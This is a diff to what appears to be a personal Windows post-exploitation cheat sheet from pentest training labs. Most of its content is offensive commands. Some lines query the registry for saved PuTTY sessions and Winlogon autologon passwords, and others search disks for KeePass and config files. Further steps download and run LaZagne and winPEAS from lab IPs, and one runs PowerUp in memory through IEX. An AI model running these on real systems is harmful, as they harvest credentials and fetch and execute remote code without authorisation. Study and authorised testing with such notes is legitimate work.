@@ -41,6 +41,8 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions"
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 services
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -48,10 +50,11 @@ icacls <service binary path>
 
 $env:AppKey
 
-gci -Path C:\ -Include *.kdbx,.git -File -Recurse -ErrorAction SilentlyContinue
-gci -Path C:\xampp -Include *.txt,*.ini,*.yml -File -Recurse -ErrorAction SilentlyContinue
-gci -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml -File -Recurse -ErrorAction SilentlyContinue
-gci -h -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\ -Include *.kdbx,*.git -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\xampp -Include *.txt,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\inetpub\wwwroot -Include *.txt,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
+gci -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml*,.config -File -Recurse -ErrorAction SilentlyContinue
+gci -h -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml,*.config -File -Recurse -ErrorAction SilentlyContinue
 gci C:\Users\Public
 gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 
@@ -63,22 +66,28 @@ where.exe /R C:\Windows bash.exe
 where.exe /R C:\Windows wsl.exe
 where.exe /R C:\ MultimasterAPI.dll
 where.exe /R C:\ unattend.xml
+where.exe /R C:\ *.config
 ```
 1.  Snoop on processes
 ```powershell
 Import-Module .\Watch-Command.ps1
 Get-Process | watch-command -diff -cont -verbose -property "Image Name"
 ```
-2. Run PEAS,
+2. Run Lazagne
+```powershell
+iwr http://10.10.15.155/lazagne.exe -o lazagne.exe 
+lazagne.exe /all
+```
+3. Run PEAS,
 ```powershell
 curl 192.168.45.x/winPEAS.exe -o winpeas.exe
 .\winpeas.exe
 ```
-3. PowerUp
+4. PowerUp
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('http://192.168.45.x/PowerUp.ps1');Invoke-Allchecks
 ```
-4. Running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester
+5. Running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester
 ```
 post/multi/recon/local_exploit_suggester
 ```
